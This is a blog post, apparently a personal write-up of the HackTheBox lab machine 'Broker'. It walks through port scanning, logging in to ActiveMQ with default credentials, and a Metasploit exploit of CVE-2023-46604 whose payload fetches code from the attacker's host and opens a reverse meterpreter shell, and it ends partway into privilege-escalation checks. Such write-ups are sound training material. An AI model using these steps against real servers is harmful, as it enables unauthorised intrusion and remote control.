<!doctype html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="theme-color" media="(prefers-color-scheme: light)" content="#f7f7f7"><meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1e"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black-translucent"><meta name="viewport" content="width=device-width, user-scalable=no initial-scale=1, shrink-to-fit=no, viewport-fit=cover" ><meta name="generator" content="Jekyll v4.4.1" /><meta property="og:title" content="Broker" /><meta property="og:locale" content="en" /><meta name="description" content="HackTheBox Easy Machine Broker" /><meta property="og:description" content="HackTheBox Easy Machine Broker" /><link rel="canonical" href="https://strongshiv8.github.io/posts/Broker/" /><meta property="og:url" content="https://strongshiv8.github.io/posts/Broker/" /><meta property="og:site_name" content="StrongShiv8" /><meta property="og:image" content="https://strongshiv8.github.io/Vulnhub-Files/img/Broker/Untitled.png" /><meta property="og:image:alt" content="HackTheBox Easy Machine 🪢" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2023-12-10T00:00:00+05:30" /><meta name="twitter:card" content="summary_large_image" /><meta property="twitter:image" content="https://strongshiv8.github.io/Vulnhub-Files/img/Broker/Untitled.png" /><meta name="twitter:image:alt" content="HackTheBox Easy Machine 🪢" /><meta property="twitter:title" content="Broker" /><meta name="twitter:site" content="@StrongShiv8" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2025-04-12T20:09:49+05:30","datePublished":"2023-12-10T00:00:00+05:30","description":"HackTheBox Easy Machine Broker","headline":"Broker","image":{"alt":"HackTheBox Easy Machine 🪢","url":"https://strongshiv8.github.io/Vulnhub-Files/img/Broker/Untitled.png","@type":"imageObject"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://strongshiv8.github.io/posts/Broker/"},"url":"https://strongshiv8.github.io/posts/Broker/"}</script><title>Broker | StrongShiv8</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="StrongShiv8"><meta name="application-name" content="StrongShiv8"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="/assets/css/jekyll-theme-chirpy.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.7.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tocbot@4.32.2/dist/tocbot.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/glightbox@3.3.0/dist/css/glightbox.min.css"> <script src="/assets/js/dist/theme.min.js"></script> <script defer src="https://cdn.jsdelivr.net/combine/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js,npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.umd.min.js,npm/glightbox@3.3.0/dist/js/glightbox.min.js,npm/clipboard@2.0.11/dist/clipboard.min.js,npm/dayjs@1.11.13/dayjs.min.js,npm/dayjs@1.11.13/locale/en.js,npm/dayjs@1.11.13/plugin/relativeTime.js,npm/dayjs@1.11.13/plugin/localizedFormat.js,npm/tocbot@4.32.2/dist/tocbot.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script> document.addEventListener('DOMContentLoaded', () => { const pv = document.getElementById('pageviews'); if (pv !== null) { const uri = location.pathname.replace(/\/$/, ''); const url = `https://strongshiv8.goatcounter.com/counter/${encodeURIComponent(uri)}.json`; fetch(url) .then((response) => response.json()) .then((data) => { const count = data.count.replace(/\s/g, ''); pv.innerText = new Intl.NumberFormat().format(count); }) .catch((error) => { pv.innerText = '1'; }); } }); </script> <script defer src="/app.min.js?baseurl=&register=true" ></script> <script async src="https://gc.zgo.at/count.js" data-goatcounter="https://strongshiv8.goatcounter.com/count" ></script> <script src="/assets/js/progress.js" defer></script> <script src="/assets/js/auto-update.js" defer></script><body><aside aria-label="Sidebar" id="sidebar" class="d-flex flex-column align-items-end"><header class="profile-wrapper"> <a href="/" id="avatar" class="rounded-circle"><img src="/assets/images/avatar/avatar.jpeg" width="112" height="112" alt="avatar" onerror="this.style.display='none'"></a> <a class="site-title d-block" href="/">StrongShiv8</a><p class="site-subtitle fst-italic mb-0">OSCP | eJPTv2 | Cyber Security Fanatic</p></header><nav class="flex-column flex-grow-1 w-100 ps-0"><ul class="nav"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tags"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle"></i> <span>ABOUT</span> </a></ul></nav><div class="sidebar-bottom d-flex flex-wrap align-items-center w-100"> <button type="button" class="btn btn-link nav-link" aria-label="Switch Mode" id="mode-toggle"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/StrongShiv8" aria-label="github" target="_blank" rel="noopener noreferrer" > <i class="fab fa-github"></i> </a> <a href="javascript:location.href = 'mailto:' + ['lht.shivendra','gmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="https://app.hackthebox.com/users/595651" aria-label="hackthebox" target="_blank" rel="noopener noreferrer" > <i class="fa-solid fa-cube"></i> </a> <a href="https://www.linkedin.com/in/shivendra-prajapati-a788401a5/" aria-label="linkedin" target="_blank" rel="noopener noreferrer" > <i class="fab fa-linkedin"></i> </a></div></aside><div id="main-wrapper" class="d-flex justify-content-center"><div class="container d-flex flex-column px-xxl-5"><header id="topbar-wrapper" aria-label="Top Bar"><div id="topbar" class="d-flex align-items-center justify-content-between px-lg-3 h-100" ><nav id="breadcrumb" aria-label="Breadcrumb"> <span> <a href="/">Home</a> </span> <span>Broker</span></nav><button type="button" id="sidebar-trigger" class="btn btn-link"> <i class="fas fa-bars fa-fw"></i> </button><div id="topbar-title"> Post</div><button type="button" id="search-trigger" class="btn btn-link"> <i class="fas fa-search fa-fw"></i> </button> <search id="search" class="align-items-center ms-3 ms-lg-0"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..." > </search> <button type="button" class="btn btn-link text-decoration-none" id="search-cancel">Cancel</button></div></header><div class="row flex-grow-1"><main aria-label="Main Content" class="col-12 col-lg-11 col-xl-9 px-md-4"><article class="px-1" data-toc="true"><header><h1 data-toc-skip>Broker</h1><div class="post-meta text-muted"> <span> Posted <time data-ts="1702146600" data-df="ll" data-bs-toggle="tooltip" data-bs-placement="bottom" > Dec 10, 2023 </time> </span> <span> Updated <time data-ts="1744468789" data-df="ll" data-bs-toggle="tooltip" data-bs-placement="bottom" > Apr 12, 2025 </time> </span><div class="mt-3 mb-3"> <a href="/Vulnhub-Files/img/Broker/Untitled.png" class="popup img-link preview-img shimmer"><img src="/Vulnhub-Files/img/Broker/Untitled.png" alt="HackTheBox Easy Machine 🪢" width="1200" height="630" loading="lazy"></a><figcaption class="text-center pt-2 pb-2">HackTheBox Easy Machine 🪢</figcaption></div><div class="d-flex justify-content-between"> <span> By <em> <a href="https://twitter.com/StrongShiv8">Shivendra Prajapati</a> </em> </span><div> <span> <em id="pageviews"> <i class="fas fa-spinner fa-spin small"></i> </em> views </span> <span class="readtime" data-bs-toggle="tooltip" data-bs-placement="bottom" title="2714 words" > <em>15 min</em> read</span></div></div></div></header><div id="toc-bar" class="d-flex align-items-center justify-content-between invisible"> <span class="label text-truncate">Broker</span> <button type="button" class="toc-trigger btn me-1"> <i class="fa-solid fa-list-ul fa-fw"></i> </button></div><button id="toc-solo-trigger" type="button" class="toc-trigger btn btn-outline-secondary btn-sm"> <span class="label ps-2 pe-1">Contents</span> <i class="fa-solid fa-angle-right fa-fw"></i> </button> <dialog id="toc-popup" class="p-0"><div class="header d-flex flex-row align-items-center justify-content-between"><div class="label text-truncate py-2 ms-4">Broker</div><button id="toc-popup-close" type="button" class="btn mx-1 my-1 opacity-75"> <i class="fas fa-close"></i> </button></div><div id="toc-popup-content" class="px-4 py-3 pb-4"></div></dialog><div class="content"><blockquote class="prompt-tip"><p>HackTheBox Easy Machine <a href="https://app.hackthebox.com/machines/Broker">Broker</a></p></blockquote><h2 id="port-scan-results-️"><span class="me-2">Port Scan Results ⤵️</span><a href="#port-scan-results-️" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><div class="language-bash nolineno highlighter-rouge" file="Nmap_Result.txt"><div class="code-header"> <span data-label-text="Nmap_Result.txt"><i class="far fa-file-code fa-fw"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
</pre><td class="rouge-code"><pre>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Downloads/HTB/Broken]
└─<span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-p-</span> <span class="nt">-T4</span> <span class="nt">-oN</span> Nmap_Result.txt 10.10.11.243                                              
<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>kali: 
Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2023-12-05 20:47 IST
Warning: 10.10.11.243 giving up on port because retransmission cap hit <span class="o">(</span>6<span class="o">)</span><span class="nb">.</span>
Nmap scan report <span class="k">for </span>10.10.11.243
Host is up <span class="o">(</span>0.17s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 65521 closed tcp ports <span class="o">(</span>reset<span class="o">)</span>
PORT      STATE    SERVICE        VERSION
22/tcp    open     ssh            OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp    open     http           nginx 1.18.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
|_http-title: Error 401 Unauthorized
| http-auth: 
| HTTP/1.1 401 Unauthorized<span class="se">\x</span>0D
|_  basic <span class="nv">realm</span><span class="o">=</span>ActiveMQRealm
|_http-server-header: nginx/1.18.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
1883/tcp  open     mqtt
|_mqtt-subscribe: Failed to receive control packet from server.
4032/tcp  filtered vrts-auth-port
5672/tcp  open     amqp?
|_amqp-info: ERROR: AQMP:handshake expected header <span class="o">(</span>1<span class="o">)</span> frame, but was 65
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GetRequest, HTTPOptions, RPCCheck, RTSPRequest, SSLSessionReq, TerminalServerCookie: 
|     AMQP
|     AMQP
|     amqp:decode-error
|_    7Connection from client using unsupported AMQP attempted
8161/tcp  open     http           Jetty 9.4.39.v20210325
|_http-title: Error 401 Unauthorized
|_http-server-header: Jetty<span class="o">(</span>9.4.39.v20210325<span class="o">)</span>
| http-auth: 
| HTTP/1.1 401 Unauthorized<span class="se">\x</span>0D
|_  basic <span class="nv">realm</span><span class="o">=</span>ActiveMQRealm
15379/tcp filtered unknown
15994/tcp filtered unknown
43549/tcp open     tcpwrapped
55093/tcp filtered unknown
57897/tcp filtered unknown
61613/tcp open     stomp          Apache ActiveMQ
| fingerprint-strings: 
|   HELP4STOMP: 
|     ERROR
|     content-type:text/plain
|     message:Unknown STOMP action: HELP
|     org.apache.activemq.transport.stomp.ProtocolException: Unknown STOMP action: HELP
|     org.apache.activemq.transport.stomp.ProtocolConverter.onStompCommand<span class="o">(</span>ProtocolConverter.java:258<span class="o">)</span>
|     org.apache.activemq.transport.stomp.StompTransportFilter.onCommand<span class="o">(</span>StompTransportFilter.java:85<span class="o">)</span>
|     org.apache.activemq.transport.TransportSupport.doConsume<span class="o">(</span>TransportSupport.java:83<span class="o">)</span>
|     org.apache.activemq.transport.tcp.TcpTransport.doRun<span class="o">(</span>TcpTransport.java:233<span class="o">)</span>
|     org.apache.activemq.transport.tcp.TcpTransport.run<span class="o">(</span>TcpTransport.java:215<span class="o">)</span>
|_    java.lang.Thread.run<span class="o">(</span>Thread.java:750<span class="o">)</span>
61614/tcp open     http           Jetty 9.4.39.v20210325
|_http-title: Site does not have a title.
|_http-server-header: Jetty<span class="o">(</span>9.4.39.v20210325<span class="o">)</span>
| http-methods: 
|_  Potentially risky methods: TRACE
61616/tcp open     apachemq       ActiveMQ OpenWire transport
| fingerprint-strings: 
|   NULL: 
|     ActiveMQ
|     TcpNoDelayEnabled
|     SizePrefixDisabled
|     CacheSize
|     ProviderName 
|     ActiveMQ
|     StackTraceEnabled
|     PlatformDetails 
|     Java
|     CacheEnabled
|     TightEncodingEnabled
|     MaxFrameSize
|     MaxInactivityDuration
|     MaxInactivityDurationInitalDelay
|     ProviderVersion 
|_    5.15.15
3 services unrecognized despite returning data.
</pre></table></code></div></div><h2 id="web-enumeration-️"><span class="me-2">Web Enumeration ⤵️</span><a href="#web-enumeration-️" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>I checked port 80 and I encounterd with a login popup , I tried <code class="language-plaintext highlighter-rouge">admin : admin</code> and I am in →</p><p><a href="/Vulnhub-Files/img/Broker/Untitled%201.png" class="popup img-link shimmer"><img src="/Vulnhub-Files/img/Broker/Untitled%201.png" alt="Untitled" loading="lazy"></a></p><p>Found out that this site is of ActiveMQ and running on version <code class="language-plaintext highlighter-rouge">5.15.15</code> I checked online about any vulnerability and I got one <code class="language-plaintext highlighter-rouge">CVE 2023-46604</code> .</p><p><a href="/Vulnhub-Files/img/Broker/Untitled%202.png" class="popup img-link shimmer"><img src="/Vulnhub-Files/img/Broker/Untitled%202.png" alt="Untitled" loading="lazy"></a></p><p>I got an exploit module from this reference and information →</p><p><a href="https://www.huntress.com/blog/critical-vulnerability-exploitation-of-apache-activemq-cve-2023-46604">Critical Vulnerability: Exploitation of Apache ActiveMQ CVE-2023-46604</a></p><p>I searched on metasploit about activemq and I got the one which I wanted →</p><div class="language-bash nolineno highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
138
139
140
141
142
143
144
145
146
147
148
149
150
151
152
153
154
155
156
157
158
159
160
161
162
163
164
165
166
167
168
</pre><td class="rouge-code"><pre>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Downloads/HTB/Broken]
└─<span class="nv">$ </span>msfconsole <span class="nt">-q</span>                                                                                    
search activemq
msf6 <span class="o">&gt;</span> search activemq

Matching Modules
<span class="o">=========</span>
   <span class="c">#  Name                                                      Disclosure Date  Rank       Check  Description</span>
   -  <span class="nt">----</span>                                                      <span class="nt">---------------</span>  <span class="nt">----</span>       <span class="nt">-----</span>  <span class="nt">-----------</span>
   0  exploit/multi/http/apache_activemq_upload_jsp             2016-06-01       excellent  No     ActiveMQ web shell upload
   1  exploit/windows/http/apache_activemq_traversal_upload     2015-08-19       excellent  Yes    Apache ActiveMQ 5.x-5.11.1 directory or files bruteforcing Shell Upload
   2  auxiliary/scanner/http/apache_activemq_traversal                           normal     No     Apache ActiveMQ directory or files bruteforcing
   3  auxiliary/scanner/http/apache_activemq_source_disclosure                   normal     No     Apache ActiveMQ JSP Files Source Disclosure
   4  exploit/multi/misc/apache_activemq_rce_cve_2023_46604     2023-10-27       excellent  Yes    Apache ActiveMQ Unauthenticated Remote Code Execution
   5  exploit/windows/browser/samsung_security_manager_put      2016-08-05       excellent  No     Samsung Security Manager 1.4 ActiveMQ Broker Service PUT Method Remote Code Execution

Interact with a module by name or index. For example info 5, use 5 or use exploit/windows/browser/samsung_security_manager_put

msf6 <span class="o">&gt;</span>
msf6 <span class="o">&gt;</span> use exploit/multi/misc/apache_activemq_rce_cve_2023_46604
msf6 exploit<span class="o">(</span>multi/misc/apache_activemq_rce_cve_2023_46604<span class="o">)</span> <span class="o">&gt;</span> options

Module options <span class="o">(</span>exploit/multi/misc/apache_activemq_rce_cve_2023_46604<span class="o">)</span>:

   Name     Current Setting  Required  Description
   <span class="nt">----</span>     <span class="nt">---------------</span>  <span class="nt">--------</span>  <span class="nt">-----------</span>
   CHOST                     no        The <span class="nb">local </span>client address
   CPORT                     no        The <span class="nb">local </span>client port
   Proxies                   no        A proxy chain of format <span class="nb">type</span>:host:port[,type:host:port][...]
   RHOSTS                    <span class="nb">yes       </span>The target host<span class="o">(</span>s<span class="o">)</span>, see https://docs.metasploit.com/docs/using-metasploit/basics/using
                                       <span class="nt">-metasploit</span>.html
   RPORT    61616            <span class="nb">yes       </span>The target port <span class="o">(</span>TCP<span class="o">)</span>
   SRVHOST  0.0.0.0          <span class="nb">yes       </span>The <span class="nb">local </span>host or network interface to listen on. This must be an address on the <span class="nb">local
                                        </span>machine or 0.0.0.0 to listen on all addresses.
   SRVPORT  8080             <span class="nb">yes       </span>The <span class="nb">local </span>port to listen on.
   SSLCert                   no        Path to a custom SSL certificate <span class="o">(</span>default is randomly generated<span class="o">)</span>
   URIPATH                   no        The URI to use <span class="k">for </span>this exploit <span class="o">(</span>default is random<span class="o">)</span>

Payload options <span class="o">(</span>cmd/windows/http/x64/meterpreter/reverse_tcp<span class="o">)</span>:

   Name                Current Setting  Required  Description
   <span class="nt">----</span>                <span class="nt">---------------</span>  <span class="nt">--------</span>  <span class="nt">-----------</span>
   EXITFUNC            process          <span class="nb">yes       </span>Exit technique <span class="o">(</span>Accepted: <span class="s1">''</span>, seh, thread, process, none<span class="o">)</span>
   FETCH_COMMAND       CERTUTIL         <span class="nb">yes       </span>Command to fetch payload <span class="o">(</span>Accepted: CURL, TFTP, CERTUTIL<span class="o">)</span>
   FETCH_DELETE        <span class="nb">false            yes       </span>Attempt to delete the binary after execution
   FETCH_FILENAME      fNZjDBukaLtz     no        Name to use on remote system when storing payload<span class="p">;</span> cannot contain spaces.
   FETCH_SRVHOST                        no        Local IP to use <span class="k">for </span>serving payload
   FETCH_SRVPORT       8080             <span class="nb">yes       </span>Local port to use <span class="k">for </span>serving payload
   FETCH_URIPATH                        no        Local URI to use <span class="k">for </span>serving payload
   FETCH_WRITABLE_DIR  %TEMP%           <span class="nb">yes       </span>Remote writable <span class="nb">dir </span>to store payload<span class="p">;</span> cannot contain spaces.
   LHOST               10.0.2.77        <span class="nb">yes       </span>The listen address <span class="o">(</span>an interface may be specified<span class="o">)</span>
   LPORT               4444             <span class="nb">yes       </span>The listen port

Exploit target:

   Id  Name
   <span class="nt">--</span>  <span class="nt">----</span>
   0   Windows

View the full module info with the info, or info <span class="nt">-d</span> command.

msf6 exploit<span class="o">(</span>multi/misc/apache_activemq_rce_cve_2023_46604<span class="o">)</span> <span class="o">&gt;</span> 
msf6 exploit<span class="o">(</span>multi/misc/apache_activemq_rce_cve_2023_46604<span class="o">)</span> <span class="o">&gt;</span> show targets

Exploit targets:
<span class="o">==========</span>
    Id  Name
    <span class="nt">--</span>  <span class="nt">----</span>
<span class="o">=&gt;</span>  0   Windows
    1   Linux
    2   Unix

msf6 exploit<span class="o">(</span>multi/misc/apache_activemq_rce_cve_2023_46604<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>target 1
target <span class="o">=&gt;</span> 1
msf6 exploit<span class="o">(</span>multi/misc/apache_activemq_rce_cve_2023_46604<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>FETCH_WRITABLE_DIR /tmp
FETCH_WRITABLE_DIR <span class="o">=&gt;</span> /tmp
msf6 exploit<span class="o">(</span>multi/misc/apache_activemq_rce_cve_2023_46604<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>LHOST tun0
LHOST <span class="o">=&gt;</span> 10.10.14.86
msf6 exploit<span class="o">(</span>multi/misc/apache_activemq_rce_cve_2023_46604<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>RHOSTS 10.10.11.243
RHOSTS <span class="o">=&gt;</span> 10.10.11.243
msf6 exploit<span class="o">(</span>multi/misc/apache_activemq_rce_cve_2023_46604<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>SRVPORT 9000
SRVPORT <span class="o">=&gt;</span> 8000
msf6 exploit<span class="o">(</span>multi/misc/apache_activemq_rce_cve_2023_46604<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>FETCH_SRVPORT 9001
FETCH_SRVPORT <span class="o">=&gt;</span> 8000
msf6 exploit<span class="o">(</span>multi/misc/apache_activemq_rce_cve_2023_46604<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>payload cmd/linux/http/x64/meterpreter/reverse_tcp
msf6 exploit<span class="o">(</span>multi/misc/apache_activemq_rce_cve_2023_46604<span class="o">)</span> <span class="o">&gt;</span> options

Module options <span class="o">(</span>exploit/multi/misc/apache_activemq_rce_cve_2023_46604<span class="o">)</span>:

   Name     Current Setting  Required  Description
   <span class="nt">----</span>     <span class="nt">---------------</span>  <span class="nt">--------</span>  <span class="nt">-----------</span>
   CHOST                     no        The <span class="nb">local </span>client address
   CPORT                     no        The <span class="nb">local </span>client port
   Proxies                   no        A proxy chain of format <span class="nb">type</span>:host:port[,type:host:port][...]
   RHOSTS   10.10.11.243     <span class="nb">yes       </span>The target host<span class="o">(</span>s<span class="o">)</span>, see https://docs.metasploit.com/docs/using-metasploit/basics/using
                                       <span class="nt">-metasploit</span>.html
   RPORT    61616            <span class="nb">yes       </span>The target port <span class="o">(</span>TCP<span class="o">)</span>
   SRVHOST  0.0.0.0          <span class="nb">yes       </span>The <span class="nb">local </span>host or network interface to listen on. This must be an address on the <span class="nb">local
                                        </span>machine or 0.0.0.0 to listen on all addresses.
   SRVPORT  9000             <span class="nb">yes       </span>The <span class="nb">local </span>port to listen on.
   SSLCert                   no        Path to a custom SSL certificate <span class="o">(</span>default is randomly generated<span class="o">)</span>
   URIPATH                   no        The URI to use <span class="k">for </span>this exploit <span class="o">(</span>default is random<span class="o">)</span>

Payload options <span class="o">(</span>cmd/linux/http/x64/meterpreter/reverse_tcp<span class="o">)</span>:

   Name                Current Setting  Required  Description
   <span class="nt">----</span>                <span class="nt">---------------</span>  <span class="nt">--------</span>  <span class="nt">-----------</span>
   EXITFUNC            process          <span class="nb">yes       </span>Exit technique <span class="o">(</span>Accepted: <span class="s1">''</span>, seh, thread, process, none<span class="o">)</span>
   FETCH_COMMAND       CERTUTIL         <span class="nb">yes       </span>Command to fetch payload <span class="o">(</span>Accepted: CURL, TFTP, CERTUTIL<span class="o">)</span>
   FETCH_DELETE        <span class="nb">false            yes       </span>Attempt to delete the binary after execution
   FETCH_FILENAME      czuIaEfmS        no        Name to use on remote system when storing payload<span class="p">;</span> cannot contain spaces.
   FETCH_SRVHOST                        no        Local IP to use <span class="k">for </span>serving payload
   FETCH_SRVPORT       9001             <span class="nb">yes       </span>Local port to use <span class="k">for </span>serving payload
   FETCH_URIPATH                        no        Local URI to use <span class="k">for </span>serving payload
   FETCH_WRITABLE_DIR  /tmp             <span class="nb">yes       </span>Remote writable <span class="nb">dir </span>to store payload<span class="p">;</span> cannot contain spaces.
   LHOST               10.10.14.86      <span class="nb">yes       </span>The listen address <span class="o">(</span>an interface may be specified<span class="o">)</span>
   LPORT               4444             <span class="nb">yes       </span>The listen port

Exploit target:

   Id  Name
   <span class="nt">--</span>  <span class="nt">----</span>
   1   Linux

View the full module info with the info, or info <span class="nt">-d</span> command.

msf6 exploit<span class="o">(</span>multi/misc/apache_activemq_rce_cve_2023_46604<span class="o">)</span> <span class="o">&gt;</span> run

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Started reverse TCP handler on 10.10.14.86:4444 
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 10.10.11.243:61616 - Running automatic check <span class="o">(</span><span class="s2">"set AutoCheck false"</span> to disable<span class="o">)</span>
<span class="o">[</span>+] 10.10.11.243:61616 - The target appears to be vulnerable. Apache ActiveMQ 5.15.15
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 10.10.11.243:61616 - Using URL: http://10.10.14.86:9000/JT6achMbwqF
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 10.10.11.243:61616 - Sent ClassPathXmlApplicationContext configuration file.
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 10.10.11.243:61616 - Sent ClassPathXmlApplicationContext configuration file.
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Sending stage <span class="o">(</span>3045380 bytes<span class="o">)</span> to 10.10.11.243
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Meterpreter session 1 opened <span class="o">(</span>10.10.14.86:4444 -&gt; 10.10.11.243:35206<span class="o">)</span> at 2023-12-07 14:12:09 +0530
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 10.10.11.243:61616 - Server stopped.

meterpreter <span class="o">&gt;</span> getuid
Server username: activemq
meterpreter <span class="o">&gt;</span> shell
Process 1408 created.
Channel 1 created.
python3 <span class="nt">-c</span> <span class="s1">'import pty;pty.spawn("/bin/bash")'</span>
activemq@broker:/opt/apache-activemq-5.15.15/bin<span class="nv">$ </span><span class="nb">whoami
whoami
</span>activemq
activemq@broker:/opt/apache-activemq-5.15.15/bin<span class="nv">$ </span><span class="nb">id
id
</span><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>activemq<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>activemq<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1000<span class="o">(</span>activemq<span class="o">)</span>
activemq@broker:/opt/apache-activemq-5.15.15/bin<span class="nv">$ </span><span class="nb">cd</span> ~
<span class="nb">cd</span> ~
activemq@broker:~<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-al</span>
<span class="nb">ls</span> <span class="nt">-al</span>
total 32
drwxr-x--- 4 activemq activemq 4096 Nov  7 08:44 <span class="nb">.</span>
drwxr-xr-x 3 root     root     4096 Nov  6 01:18 ..
lrwxrwxrwx 1 root     root        9 Nov  5 04:14 .bash_history -&gt; /dev/null
<span class="nt">-rw-r--r--</span> 1 activemq activemq  220 Nov  5 00:15 .bash_logout
<span class="nt">-rw-r--r--</span> 1 activemq activemq 3771 Nov  5 00:15 .bashrc
drwx------ 2 activemq activemq 4096 Nov  7 06:46 .cache
drwxrwxr-x 3 activemq activemq 4096 Nov  7 08:17 .local
<span class="nt">-rw-r--r--</span> 1 activemq activemq  807 Nov  5 00:15 .profile
<span class="nt">-rw-r-----</span> 1 root     activemq   33 Dec  7 05:12 user.txt
activemq@broker:~<span class="nv">$ </span><span class="nb">cat </span>user.txt
<span class="nb">cat </span>user.txt
8b28b04cd22b96690da1f568923ad4a7
activemq@broker:~<span class="err">$</span>
</pre></table></code></div></div><p>Now I got the shell so lets dig deeper to get the root access →</p><div class="language-bash nolineno highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre>activemq@broker:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
<span class="nb">sudo</span> <span class="nt">-l</span>
